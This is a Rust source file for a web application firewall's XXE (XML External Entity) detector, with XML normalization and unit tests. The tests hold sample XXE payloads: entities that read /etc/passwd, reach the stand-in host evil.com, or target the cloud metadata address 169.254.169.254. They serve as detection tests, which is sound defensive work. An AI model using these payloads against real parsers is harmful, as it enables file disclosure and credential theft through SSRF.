use aho_corasick::AhoCorasick;
use std::sync::Arc;

use crate::waf::attack_detection::config::{AttackDetectionResult, AttackType, InputLocation};
use crate::waf::attack_detection::detector_common::{BasePatternDetector, PatternDetector};
use crate::waf::attack_detection::patterns::DefaultPatterns;

pub struct XxeDetector {
    inner: BasePatternDetector,
}

impl XxeDetector {
    pub fn new(paranoia_level: u8, custom_patterns: &[String]) -> Self {
        let inner = BasePatternDetector::new(
            DefaultPatterns::xxe().as_slice(),
            DefaultPatterns::xxe_high().as_slice(),
            custom_patterns,
            paranoia_level,
            AttackType::Xxe,
            "xxe",
        );
        Self { inner }
    }

    fn detect_with_xml_normalization(
        &self,
        input: &str,
        location: InputLocation,
    ) -> Option<AttackDetectionResult> {
        let decoded = if input.contains('%') || input.contains('+') {
            crate::utils::url_decode_all(input)
        } else {
            input.to_string()
        };
        let normalized = normalize_xml(&decoded);
        let normalized_lower = normalized.to_lowercase();

        if let Some(mat) = self.inner.patterns_ref().find(&normalized_lower) {
            let matched = normalized[mat.start()..mat.end()].to_string();

            tracing::warn!(
                attack_type = "xxe",
                matched_pattern = %matched,
                location = %location,
                "XXE attack detected"
            );

            return Some(AttackDetectionResult {
                attack_type: AttackType::Xxe,
                fingerprint: None,
                matched_pattern: Some(matched),
                input_location: location,
            });
        }

        None
    }
}

impl PatternDetector for XxeDetector {
    fn patterns(&self) -> &Arc<AhoCorasick> {
        self.inner.patterns()
    }

    fn detect(&self, input: &str, location: InputLocation) -> Option<AttackDetectionResult> {
        self.detect_with_xml_normalization(input, location)
    }

    fn detect_in_headers<F>(
        &self,
        headers: &http::HeaderMap,
        mut check_header: F,
        _normalizer: Option<&crate::waf::attack_detection::normalizer::InputNormalizer>,
    ) -> Option<AttackDetectionResult>
    where
        F: FnMut(&str) -> bool,
    {
        for (name, value) in headers.iter() {
            if let Ok(header_value) = value.to_str() {
                let header_name = name.as_str();
                if check_header(header_name) {
                    if let Some(result) =
                        self.detect(header_value, InputLocation::Header(header_name.into()))
                    {
                        return Some(result);
                    }
                }
            }
        }
        None
    }
}

fn normalize_xml(input: &str) -> String {
    let mut result = String::new();
    let mut chars = input.chars().peekable();
    let mut in_comment = false;

    while let Some(c) = chars.next() {
        if in_comment {
            if c == '-' {
                if let Some(&next) = chars.peek() {
                    if next == '-' {
                        chars.next();
                        if let Some(&next2) = chars.peek() {
                            if next2 == '>' {
                                chars.next();
                                in_comment = false;
                                continue;
                            }
                        }
                    }
                }
            }
            continue;
        }

        if c == '<' {
            if let Some(&next) = chars.peek() {
                if next == '!' {
                    chars.next();
                    if let Some(&next2) = chars.peek() {
                        if next2 == '-' {
                            chars.next();
                            if let Some(&next3) = chars.peek() {
                                if next3 == '-' {
                                    chars.next();
                                    in_comment = true;
                                    continue;
                                }
                            }
                        }
                    }
                }
            }
        }

        match c {
            '\t' | '\n' | '\r' => result.push(' '),
            c => result.push(c),
        }
    }

    result
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_xxe_basic() {
        let detector = XxeDetector::new(2, &[]);
        let input = r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>"#;
        assert!(detector.detect(input, InputLocation::PostBody).is_some());
    }

    #[test]
    fn test_xxe_parameter_entity() {
        let detector = XxeDetector::new(2, &[]);
        let input = r#"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com">]>"#;
        assert!(detector.detect(input, InputLocation::PostBody).is_some());
    }

    #[test]
    fn test_xxe_ssrf() {
        let detector = XxeDetector::new(2, &[]);
        let input = r#"<!ENTITY xxe SYSTEM "http://169.254.169.254">"#;
        assert!(detector.detect(input, InputLocation::PostBody).is_some());
    }

    #[test]
    fn test_xxe_benign() {
        let detector = XxeDetector::new(2, &[]);
        let input = r#"<?xml version="1.0"?><root><name>test</name></root>"#;
        assert!(detector.detect(input, InputLocation::PostBody).is_none());
    }

    #[test]
    fn test_xxe_case_insensitive() {
        let detector = XxeDetector::new(2, &[]);
        let input = r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>"#;
        assert!(detector.detect(input, InputLocation::PostBody).is_some());
    }

    #[test]
    fn test_xxe_uppercase() {
        let detector = XxeDetector::new(2, &[]);
        let input = r#"<!DOCTYPE FOO [<!ENTITY XXE SYSTEM "FILE:///ETC/PASSWD">]>"#;
        assert!(detector.detect(input, InputLocation::PostBody).is_some());
    }

    #[test]
    fn test_xxe_mixed_case() {
        let detector = XxeDetector::new(2, &[]);
        let input = r#"<!DoCtYpE foo [<!EnTiTy xxe SyStEm "file:///etc/passwd">]>"#;
        assert!(detector.detect(input, InputLocation::PostBody).is_some());
    }

    #[test]
    fn test_xxe_url_encoded() {
        let detector = XxeDetector::new(2, &[]);
        let input = "%3C!DOCTYPE foo%3E";
        assert!(detector.detect(input, InputLocation::PostBody).is_some());
    }
}
